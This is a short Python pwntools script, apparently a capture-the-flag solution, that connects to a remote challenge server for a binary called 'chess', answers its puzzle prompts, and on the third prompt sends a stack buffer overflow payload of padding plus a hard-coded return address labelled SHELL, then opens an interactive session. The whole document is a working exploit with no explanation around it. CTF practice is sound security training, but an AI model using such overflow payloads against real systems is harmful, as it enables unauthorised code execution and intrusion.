from pwn import *

exe = ELF("chess")
SHELL = p64(0x004011c2)
context.terminal = ["alacritty", "-e", "sh", "-c"]
script = """
b *0x00401cd4
"""
# r = process(exe.path)
# gdb.attach(r, gdbscript=script)
r = remote("challenges.ctfd.io", 30458)

# Option
r.recv(10000)
r.sendline("1")

# Name
r.recvuntil(">> ")
r.sendline("asdf")

# Puzzle 1
r.recvuntil(">> ")
r.sendline("Ra1")

# Puzzle 2
r.recvuntil(">> ")
r.sendline("Qg7 " + "A" * 122)

# Puzzle 3
r.recvuntil(">> ")
payload = b"Kd2 "
payload += b"A" * 86
payload += SHELL
r.sendline(payload)
r.interactive()
